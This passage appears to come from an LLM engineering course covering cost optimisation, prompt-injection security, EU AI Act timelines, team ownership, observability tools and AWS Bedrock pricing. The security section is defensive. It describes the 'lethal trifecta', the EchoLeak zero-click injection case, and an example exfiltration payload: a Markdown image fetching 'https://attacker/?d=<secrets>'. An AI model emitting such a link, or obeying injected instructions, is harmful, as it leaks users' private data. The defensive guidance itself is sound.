6 Tool-result clearing / compaction Large on agents; one Anthropic cookbook example had ~96% of a 335K-token context as raw file reads Days Medium (compaction loses subtle context) Compact at task boundaries
7 Route/cascade to a cheaper model per query class 30–70% on the routed share Days–weeks Medium Escalate on structural signals, not self-assessment
8 Shorten output: structured formats, terse rubrics Direct, and output is the expensive side Days Low
9 Semantic caching +5–25pp hit rate over exact Days + permanent eval loop High (1–15% FP) Do last
10 Fine-tune a small model for a bounded sub-task (router, extractor, reranker) Large on that sub-task Weeks Medium Sustainable only if the sub-task is stable

#What most teams get wrong here

They negotiate the model price before auditing their cache hit rate. The prefix-discipline audit takes half an hour and frequently finds a rotating token — a timestamp, a session ID, a user name — sitting above the static block, invalidating the cache on every single request with no error and no signal. That one line is worth more than a tier discount.

Second: they budget the happy path. Cost models built on average token counts miss the fact that a small share of runs hit the step ceiling and consume the maximum. Model the failure path explicitly, and put budget-exhaustion rate on the same dashboard as cost.

Third, less obvious: they treat online guardrails and LLM judges as free. Scoring 100% of production traffic with an LLM judge can cost more than the primary call it's scoring. Sample it.

#2.9 Security and governance

#Prompt injection: architecture, not filters

Start from the position the standard itself takes. OWASP has kept prompt injection at #1 in its LLM Top 10 since the list first appeared, and the prevention guidance opens with an admission most vendors won't make: no reliable prevention mechanism exists. Input filters degrade against adaptive attackers, and a second model asked to police the first is another model that can be talked around. ESTABLISHED

The pre-deployment check that actually works is structural. The 2026 OWASP release cites the lethal trifecta (Simon Willison, 2025): an agent is exploitable when it simultaneously has

  1. access to private data (files, DB, authenticated API),
  2. exposure to untrusted content (web pages, email, documents, tool output), and
  3. a channel to communicate outward.

Remove any one leg and the exfiltration path closes. This is the design constraint to argue about in review, not the guardrail model. ESTABLISHED

Exfiltration channels people forget: - Markdown image auto-fetch in the client renderer — a generated ![](https://attacker/?d=<secrets>) is an outbound GET the moment the answer renders - ANSI escape sequences in terminal and IDE sinks (added in the 2026 OWASP edition) - Any tool that takes a URL, a webhook, an email address, or a shell argument - Generated SQL concatenated into a query; generated Markdown rendered as HTML - The trace store itself — if an injected prompt gets a secret into an output, you've now persisted it

Indirect injection is the live threat, not the theoretical one. EchoLeak — documented as a zero-click prompt-injection exploit against a production Copilot deployment (arXiv 2509.10540) — is the reference case for "the user did nothing wrong and data left the building." There is also now an OWASP Top 10 for Agentic Applications (2026) alongside the LLM list; treat it as the agent-specific checklist.

Controls that survive contact, in priority order: 1. Break the trifecta. Segregate agents: the one that reads untrusted content has no private-data access and no egress; the one with private data reads only trusted input. 2. Capability scoping per step. Least privilege per tool call, not per agent. Read-only by default; writes behind explicit policy checks. 3. Human approval for irreversible actions — payments, deletions, external sends, permission changes. 4. Egress allowlisting. No arbitrary outbound URLs from tool calls or rendered output. Strip/deny auto-fetching image and link syntax in renderers. 5. Output-sink encoding. Treat model output as untrusted input to every downstream component: parameterise SQL, escape HTML, never pass to a shell. 6. Provenance labelling. Mark retrieved/tool content as data, not instructions, in the prompt structure, and keep it in a distinguishable region. 7. Guardrail classifiers. Have one; it helps at the margin. It is not a boundary. 8. Runtime anomaly detection on tool sequences and data movement. Catches consequences, not intent — which is still worth having, because consequences are what harm users.

MCP-specific controls carry over unchanged from Module 1 §1B.5: allowlist servers, treat MCP config changes as code changes, pin versions and hash tool descriptions with drift alerting, least privilege per server, namespace-collision detection.

#Secrets in traces

Three rules: (1) tool arguments and tool results are logged wholesale by default instrumentation — deny-list credential-shaped fields explicitly; (2) scan traces for secret patterns in the collector, not the backend; (3) rotate anything that appears, and treat the appearance as an incident, because the trace store has broader access than the secret store does.

#Access control on indexes

The retrieval layer is an access-control boundary and is frequently built as if it weren't. Requirements: ACLs and tenant IDs stored as index metadata; filters applied in the index (pre-filter or filtered ANN, not post-hoc trimming of a top-k that already leaked); re-checked after fusion and after reranking; and the same ACL applied to any cache, any agent memory store, and any trace-derived dataset. Document-level permissions must be re-synced on source-system permission changes, or you have a retrieval system that faithfully serves last month's access model.

#Lineage

For each answer, you should be able to reconstruct: which system version served it, which corpus snapshot and index build the chunks came from, which source documents and versions those chunks derive from, which model snapshot generated it, and who approved that system version. This is good engineering, and for high-risk systems under the EU AI Act it is also a documentation obligation (Art. 11 technical documentation, Art. 12 logging, Art. 17 quality management system).

#Regulatory obligations that touch engineering practice

#EU AI Act — the timeline changed in July 2026. Re-baseline.

Regulation (EU) 2026/1744 (the "Digital Omnibus on AI") was published in the Official Journal on 24 July 2026 and entered into force on 27 July 2026 — six days before the AI Act's original high-risk deadline. The deferral is enacted law, not a proposal. ESTABLISHED

Obligation Date Status
Prohibited practices (Art. 5) in force since Feb 2025 unchanged
GPAI obligations in force since Aug 2025 unchanged
Transparency (Art. 50) — disclose AI interaction, mark AI-generated audio/image/video/text applies since 2 August 2026 NOT deferred
New Art. 5 prohibitions (AI-generated NCII / CSAM) 2 December 2026 added by the Omnibus; maximum penalty tier
High-risk, Annex III (stand-alone) 2 December 2027 deferred from 2 Aug 2026
High-risk, Annex I (embedded in regulated products) 2 August 2028 deferred from 2 Aug 2027

Also relevant: Art. 4 (AI literacy) still places a direct duty on providers and deployers, with wording amended on 27 July 2026; there is a grandfathering window for systems placed on the market before the new deadlines, until they are substantially modified — so map what counts as a substantial modification, because it resets the clock; and the Omnibus adjusted the lawful basis for processing special-category data for bias detection, which unblocks fairness testing that was previously constrained.

On agents specifically: the European Commission's FAQ position is that the existing definitions in Art. 3(1) and 3(63) are sufficient to cover AI agents. There is no agent exemption. The Act regulates by risk tier, not by who built the model versus who orchestrated it into a product.

What this means for engineering, concretely: technical documentation (Art. 11), automatic logging with retention (Art. 12), human oversight design (Art. 14), accuracy/robustness/cybersecurity (Art. 15), and a documented QMS (Art. 17). Every one of those maps onto something already in this module — lineage, tracing, approval gates, eval suites, and the system-version registry. Build them as engineering artifacts, not as a compliance document written afterward, and the audit becomes an export rather than a project.

#NIST AI RMF and ISO/IEC 42001

  • NIST AI RMF 1.0 (January 2023): voluntary, non-certifiable, four functions — Govern, Map, Measure, Manage — plus NIST AI 600-1, the Generative AI Profile, which covers GenAI-specific risks (confabulation, IP leakage) that classical ML frameworks miss. Its value is as working method: it's the framework engineers will actually use to reason about risk.
  • ISO/IEC 42001:2023: the first certifiable AI management system standard — same family as ISO 27001 — with mandatory clauses plus Annex A controls (commonly cited as 38; verify against the standard). It produces an accredited certificate that answers enterprise procurement in one line. Applies to organisations that use AI, not only those that build models.
  • They are complementary, and NIST publishes a crosswalk. Mature programmes run both: RMF as method, 42001 as auditable structure and certificate. Typical certification timelines reported at 3–12 months depending on organisation size. ESTABLISHED

The engineering-relevant translation: 42001 wants a Statement of Applicability, evidence discipline over a defined period, internal audit and management review. If your system-version registry, eval history, incident log and approval records are already artifacts in your pipeline, most of that evidence already exists.

#What most teams get wrong here

They buy a guardrail model and believe the injection problem is handled. OWASP's own guidance says no reliable prevention exists; the durable control is removing one leg of the lethal trifecta. A review that asks "does this agent read untrusted content, touch private data, and have an egress path?" catches more than any classifier will.

Second, and specific: the renderer is part of the attack surface. Teams harden the agent and then render its Markdown in a client that auto-fetches images, handing the attacker a clean exfiltration channel that never touches a tool call.

Third: treating compliance as a document. The EU AI Act's engineering-facing obligations — logging, technical documentation, human oversight, robustness — are things you either build into the pipeline or reconstruct under deadline. The deferral to December 2027 is runway for building them deliberately, not a pause.

#2.10 Team and organisation

#Ownership, stated plainly

Artifact Owns it Reviews it Common failure
Prompts The engineer shipping the feature Code review, same as code Living in a SaaS UI outside review
Eval sets and rubrics A domain owner (PM, support lead, clinician, lawyer) with engineering support Both Engineers writing rubrics for a domain they don't understand — the most common cause of an eval that measures the wrong thing
The judge Whoever owns evals — Unpinned, unvalidated
Retrieval / index pipeline Data or platform engineering — Nobody owns the corpus; permissions go stale
Model registry, quotas, gateway, caching Platform — Every team integrates a provider SDK directly; no central cost or rate-limit control
Observability + eval infrastructure Platform — Each team picks a different tool; nothing is comparable
Cost per tenant Product and platform jointly Finance Nobody owns it until the bill arrives
Security review of tools/MCP servers Security, with an engineering sign-off — Treated as an npm dev-dependency

#The role split

  • AI engineer (product-facing): prompts, context assembly, tool design, evals for their feature, the golden set for their domain. Ships user-visible behaviour. Needs product judgement more than ML depth.
  • ML engineer: only genuinely needed when you train, fine-tune, or build custom retrieval/reranking models. Many teams building on vendor APIs do not need one and hire one anyway, then find the role has no training work in it.
  • Platform/infra: gateway, registry, quotas, caching, observability, eval harness, cost attribution, security controls. Build the paved road; do not own other teams' prompts.
  • Domain expert: defines what "good" means. Under-resourced in almost every team, and the constraint on eval quality.

The anti-pattern worth naming: a central "AI team" that owns all prompts for all products. It becomes a bottleneck immediately, because prompts encode product decisions and the people making those decisions are elsewhere. Central teams should own infrastructure and standards; feature teams own behaviour.

#On-call for a non-deterministic system

What changes: - Add quality to the paging criteria. A system answering wrong at normal latency pages nobody by default. Online quality score, schema-violation rate, refusal-rate shift, budget-exhaustion rate, and fallback-tier share all belong in alerting. - "Cannot reproduce" is the default state. Which is why §2.4's trace requirements are on-call infrastructure, not analytics. If the responder cannot see retrieved chunk IDs, tool arguments and the resolved model ID for the failing trace, they cannot work the incident. - The first diagnostic question is "what changed in the system version?" — including the vendor's side. Order of checks: resolved model ID ≠ requested? → index build changed? → prompt revision changed? → traffic distribution shifted? → nightly canary moved? - Rollback is the primary mitigation, and it must revert the whole system version including the index pointer. - Cost is a pageable condition. Runaway loops are an availability and a financial incident. - Blameless postmortems need a new category: "the model changed under us," which is nobody's mistake and still requires a control.

Practical: keep a one-page incident playbook enumerating the LLM-specific causes — silent model version change, prompt/config drift to prod without an eval, embedding/index mismatch, context position effects, sampling-parameter drift, wrong route or model tier, cache false positive, tool schema change — so the responder is pattern-matching against a list instead of exploring.

#What most teams get wrong here

They give prompts to whoever is fastest at writing them and evals to whoever is least busy. It should be the reverse of the instinct: prompts belong to the engineer who owns the feature and go through normal review; evals belong to the domain expert, because an eval written by someone who can't adjudicate the domain measures fluency instead of correctness.

Second: on-call has classical alerts only. The pager fires on latency and 5xx, which are the two things least likely to be wrong. Add at least online quality score and fallback-tier share before you add anything else.

#Choosing — the decision rules that actually decide

  1. Hard residency, air-gap, PHI, or "raw prompts never leave our VPC" → self-host. That narrows you to Langfuse (MIT), Helicone (Apache 2.0), MLflow (Apache 2.0), Phoenix (ELv2 — source-available, check the licence against your policy), or a DIY OTel stack. This constraint dominates every other criterion, so evaluate it first.
  2. Committed to LangGraph → LangSmith, and accept the lock-in. The trace ergonomics for graph state are genuinely better and debugging time is what you're buying.
  3. Your pain is regression testing and shipping safely, not debugging → Braintrust. The CI-blocking workflow is its actual differentiator.
  4. You want the option to change your mind → instrument with OpenTelemetry / OpenInference and treat the backend as swappable. This is the direction the market is moving and it is the cheapest insurance available. Phoenix assumes this architecture; most others now accept OTLP ingestion but verify parity with their native SDK for your language before assuming it.
  5. You just need cheap request/response logs and cost tracking, today → Helicone as a gateway. Two minutes to set up, nothing to unwind later.
  6. Very high volume with an existing observability team → self-hosted OTel + ClickHouse. You give up eval tooling and build it yourself; at sufficient volume the arithmetic favours it.

On pricing models, which matters more than the sticker: unit-based pricing (Langfuse) counts traces plus observations plus scores, so agentic workloads are 8–15× more expensive per user-visible interaction than chat workloads on the same plan. Seat-based pricing (LangSmith) scales with team size independent of usage. Data-volume pricing tracks payload size. Model your own trace shape — spans per run, payload size per span — against each model before comparing headline numbers, because the headline numbers assume a chat workload and you are probably not building one.

#What most teams get wrong here

They pick the platform before deciding whether prompts and completions may leave their network. That single question eliminates most of the field, and discovering it after integration means re-instrumenting under a compliance deadline.

Second: they let the vendor's SDK become the instrumentation. Instrument with OTel/OpenInference and export to the vendor. You keep the option to change backends, you keep control of redaction and sampling in your own collector, and you stop paying a migration cost every time the market moves — which, as the ClickHouse/Langfuse acquisition shows, it does.

Third: they compare free tiers. Free tiers are sized for chat workloads. Compute your real monthly units — spans per agent run × runs per day × 30 — before believing any of them.

#Gaps I could not close, and the experiments that would settle them

  1. No credible public breakdown of where LLM production spend actually goes by component (context vs output vs retries vs guardrails). The ranking in §2.8 is reasoned from token-accounting structure and the agentic multipliers in Module 1, not measured across a population of systems. Experiment: instrument the accounting identity for two weeks with cache-state and retry attributes on every span, and publish your own breakdown. It takes days and it is the only version of this number that will be true for you.
  2. Semantic-cache hit rates and false-positive rates come entirely from vendor blogs and practitioner reports, not controlled studies. The 20–45% and 1–15% ranges should be treated as order-of-magnitude. Experiment: sample 1,000 production queries, embed, cluster, and count how many fall within your candidate threshold — that is your ceiling, computed before you build anything.
  3. Observability pricing is genuinely contradictory across sources (LangSmith trace overage at $0.50/1k vs $2.50/1k; Braintrust Pro at $200 vs $249/mo). Nothing in §2.11 should enter a budget without verification on the vendor's own page.
  4. Neighbour-stability and embedding-canary thresholds (85–95% persistence; 0.0001–0.005 cosine) are practitioner figures with no methodology published. Treat the method as sound and calibrate thresholds on your own two-week baseline.
  5. No public data on how often vendors actually change behaviour behind a pinned snapshot. Everyone recommends the nightly canary; nobody has published a base rate. Experiment: run the frozen canary against a pinned endpoint for a quarter and publish the movement.
  6. The LLM-as-judge findings in §2.7 are scoped to March–April 2026 and English, text-only, on three benchmarks. The authors flag temporal-scope risk explicitly. Re-validate your own judge rather than inheriting their rankings.

Module 3 — AWS for RAG, Agents, LLMOps and Evaluation

Region assumed: US East (N. Virginia), us-east-1. Non-US regions carry a premium; Sydney, London and Mumbai rates differ materially and are noted where verified. Prices verified: 4 September 2026, against official AWS pricing pages fetched live (Bedrock pricing page metadata showed last update 3 September 2026; AgentCore pricing page 31 August 2026). Confidence tags: VERIFIED fetched from an official AWS page during this research. SECONDARY from a dated third-party source, not confirmed on an AWS page. UNVERIFIED not confirmed in this pass — do not quote without checking.

#0. Two things that changed recently, which invalidate most published guidance

Before anything else, because these break the assumptions in nearly every RAG-on-AWS blog post written before mid-2026.

1. Bedrock Knowledge Bases pricing was restructured. The old model — no service fee, but you pay in full for an underlying OpenSearch Serverless collection with a ~$350/month floor — is no longer the only option. Bedrock Managed Knowledge Base now bills $5.00 per GB of raw data per month for index storage and $1.00 per 1,000 Retrieve API calls, with multimodal parsing, embeddings generation and re-ranking included at no charge. AWS's own worked example: 50 GB of SharePoint content and 100,000 retrievals per month totals $350.00. Agentic (multi-hop) retrieval costs $4.00 per 1,000 agentic calls plus $1.00 per 1,000 underlying retrievals — the same corpus at 100,000 agentic calls averaging two underlying retrievals each comes to $850.00. VERIFIED — aws.amazon.com/bedrock/pricing

The "$345/month minimum even at zero traffic" figure still circulating in 2026 cost guides describes the old self-managed vector store path, not managed Knowledge Bases. Both paths still exist. Check which one a source is describing before believing its numbers.

2. OpenSearch Serverless has no minimum OCU floor any more. AWS shipped a ground-up re-architecture, "NextGen", generally available 28 May 2026, with compute decoupled from storage, scale-to-zero after a 10-minute idle window, and capacity restored in roughly 10 seconds when traffic resumes — queued, not dropped, during the wake. AWS claims up to 60% lower cost than provisioning clusters for peak, and roughly 20x faster autoscaling. VERIFIED — AWS Big Data and AWS News blogs, 28 May 2026

Classic collections still bill a 2-OCU minimum for the first collection in an account, which at $0.24 per OCU-hour works out to roughly $350/month before a single query ($175 for a 1-OCU dev/test setup with no redundant standby). SECONDARY — Coralogix OpenSearch pricing guide, updated ~31 Aug 2026, citing the AWS pricing page

Consequence: the single most-repeated argument in RAG-on-AWS content — "OpenSearch Serverless is disqualified for bursty and dev workloads because of the idle floor" — is now largely obsolete, but only if you explicitly create a NextGen collection. One practitioner reports the AOSS API defaults the generation attribute to CLASSIC when unspecified, so you can silently get the old billing model. [SECONDARY — darryl-ruggles.cloud, 1 June 2026. Worth confirming against current API docs before relying on it; it is the kind of default that changes quietly.]

#1. Model access and inference

#Bedrock service tiers VERIFIED

Bedrock now exposes four tiers plus Reserved. The multipliers are consistent across most model families:

Tier Price relative to Standard Use when
Standard 1.0x Default interactive traffic
Priority +75% Latency-critical paths only; a 1.75x premium is rarely justified
Flex −50% Background, retry-tolerant, non-interactive work
Batch −50% Asynchronous jobs, results delivered to S3
Reserved Commitment-based Sustained predictable throughput

Batch and Flex land at the same 50% discount, so the choice between them is a latency and delivery-mechanism question, not a price question. Flex keeps the synchronous API; Batch writes to S3.

The ~10% regional premium is an architecture decision, not a rounding error. Global cross-region inference profiles price below geographic and in-region profiles. If data residency forces you onto an in-region profile, budget roughly 10% more on every token, forever. Verify the current delta for your model and region — it is not uniform.

Anthropic Mythos-tier models (Mythos 5.1, Mythos 5, Mythos Preview) are gated on Bedrock and require approval through an Anthropic account team. VERIFIED Do not design around them without confirming access first.

#Provisioned Throughput is now opaque VERIFIED

The Bedrock pricing page states plainly that for Provisioned Throughput pricing you should contact your account team. Public hourly model-unit rates survive only for legacy models — Cohere Command at $49.50/hour no-commit, $39.60 with a 1-month commitment; Llama 2 at $21.18/hour on a 1-month term.

This matters more than it looks. You cannot model the cost of a PT architecture without a sales conversation. For a team doing a build-vs-buy analysis on a deadline, that is real procurement friction, and it is a legitimate reason to prefer Reserved tier or on-demand plus caching until volume justifies the call.

The legacy examples remain instructive about scale: one model unit of Cohere Command on a 1-month commitment is $29,462.40 per month. PT is not a cost optimization at small scale — it is a throughput and latency guarantee you pay a lot for.

#Custom Model Import VERIFIED, with a caveat

$0.05718 per Custom Model Unit per minute in us-east-1 ($0.07144 in Frankfurt), plus $1.95 per CMU per month storage, billed in 5-minute windows. Llama 3.1 8B at 128K context requires 2 CMUs; 70B at 128K requires 8. Scales to zero after 5 idle minutes, with a cold start in the tens of seconds. Default limit of 3 model copies per account per imported model, raisable via Service Quotas.

Discrepancy worth flagging: AWS's own worked example on that page states that 2 CMUs price at $0.1570/minute, which does not reconcile with 2 × $0.05718 = $0.11436. One of the two is stale. Model your own numbers from the rate table, not the example, and confirm with support before committing.

The scale-to-zero behaviour makes Custom Model Import genuinely interesting for spiky private-model workloads — but tens of seconds of cold start rules it out of interactive paths without a warming strategy.

#The decision boundary: Bedrock vs SageMaker vs self-hosted

[UNVERIFIED for SageMaker specifics — I did not confirm current SageMaker real-time or serverless inference rates in this pass, and will not invent them. Treat the shape of the guidance below as reasoning, not as priced fact, and price SageMaker from aws.amazon.com/sagemaker/pricing before deciding.]

The reasoning that holds regardless of the exact rates:

  • Bedrock on-demand wins on everything until you have sustained, predictable, high-volume traffic on a single model. No idle cost, no ops, instant model switching. The cost of switching models is a config change.
  • Bedrock Batch/Flex should be the default for anything a human is not waiting on. A 50% discount for accepting asynchrony is the highest-return, lowest-effort optimization available on this platform, and it is routinely left on the table.
  • SageMaker endpoints earn their place when you need a model Bedrock does not host, custom inference code, or fine-grained control over the serving stack — accepting that you now own instance sizing, autoscaling and idle cost.
  • Self-hosted on EC2/EKS with vLLM only makes sense at sustained high utilization with an engineer who owns it. The break-even is a utilization question, not a volume question: dedicated GPU capacity bills whether or not you use it, so the comparison is on-demand token spend versus instance-hours × utilization. Below roughly 40–50% sustained utilization, managed almost always wins once you price the engineer.

What most teams get wrong here: they compare Bedrock's per-token price to a GPU instance's hourly price and conclude self-hosting is cheaper, without modelling utilization, redundancy, or the cost of the person who gets paged. And they leave Batch/Flex unused on workloads that were never interactive.

#The S3 Vectors trap, stated precisely

S3 Vectors query cost has two components: a per-API fee and a data-processed charge, where data processed is your average vector size multiplied by the number of vectors in the index — not the number of results returned, and filtering does not reduce it. Average vector size counts vector data, key and filterable metadata; non-filterable metadata is excluded from processing but can still be returned. Data returned is billed at a minimum of 256 bytes per result with a 500 KB per-query free allowance. SECONDARY — AWS S3 pricing page content surfaced in search; confirm directly

So cost scales with index size × query count, not query count alone. AWS's published examples: 10 million vectors with 1 million monthly queries at $11.38/month; 500 million vectors with 10 million queries at roughly $1,320/month. One independent analysis puts the crossover at around 7.5 million vectors per index, above which per-query cost can exceed a dedicated vector database's rate. [SECONDARY — murraycole.com, Sept 2025; older than ideal, and predates GA, so treat the exact crossover as directional]

Mitigation: partition into smaller indexes. A vector bucket holds up to 10,000 indexes, each up to 2 billion vectors at 1–4,096 dimensions. S3 Vectors reached GA on 2 December 2025.

#The crossover that actually decides your retrieval architecture

Managed Knowledge Base retrieval at $1 per 1,000 calls equals a sustained 4-OCU OpenSearch NextGen bill (roughly $700/month) at about 700,000 retrievals per month. Below that, Managed KB is cheaper and includes parsing, embeddings and reranking you would otherwise build and pay for. Above it, the per-retrieval fee grows without limit while OpenSearch compute grows sub-linearly with query volume.

This is the single most useful number in this module. It is arithmetic from two verified rates, not a benchmark — recompute it with your OCU count.

#What most teams get wrong here

  • Bedrock's Quick create leaves the vector store behind. Provisioning a Knowledge Base with Quick create spins up an OpenSearch Serverless collection that meters from creation. Deleting the Knowledge Base does not delete the collection — you must delete it yourself in the OpenSearch console, and until you do, the Classic minimum keeps billing. SECONDARY — Coralogix, ~31 Aug 2026 This is the most common silent six-hundred-dollar-a-year mistake on AWS RAG projects.
  • Kendra bills from creation to deletion regardless of use, and the GenAI Enterprise index caps at 20,000 documents or 200MB extracted text on the base unit. Teams size Kendra on document count and discover the extracted-text ceiling later.
  • Nobody checks whether their AOSS collection is NextGen or Classic.

#3. Ingestion

Bedrock Data Automation VERIFIED:

Output Price
Standard document output $0.010 per page
Custom document output (≤30 fields) $0.040 per page, +$0.0005 per field beyond 30
Video standard $0.050 per minute
Audio standard $0.006 per minute

BDA integrates with Knowledge Bases as a parser, in which case it charges standardized output. AWS notes the cost structures differ fundamentally between parser options: BDA prices per page, foundation-model parsers price per token, so the comparison depends entirely on content density. AWS's own reference point: 1,000 pages where 30% contain tables and 30% contain figures runs roughly 2,900 input and 750 output tokens through an FM parser, versus $10 flat through BDA standard output. Test on your own documents.

Textract, Glue, MWAA pricing: UNVERIFIED — not confirmed this pass.

Incremental sync and re-embedding. Bedrock Managed KB includes native connectors for S3, SharePoint and Confluence with sync included in the storage price. The strategy question nobody prices: an embedding model change forces a full re-embed of the corpus. Under the managed KB model embeddings generation is free, which removes what used to be the main financial obstacle to re-embedding — a genuine and under-discussed improvement. Under a self-managed store, model the re-embed cost before you pick an embedding model, because you will change it.

Orchestration: Step Functions for durable multi-stage pipelines, EventBridge for change-driven triggers, Lambda for per-document transforms. Bedrock Flows bills $0.035 per 1,000 node transitions plus every model and service invoked VERIFIED — cheap in isolation (AWS's example flow costs $0.84/month) but loops multiply both transitions and downstream model calls, so the node fee is never the number that hurts.
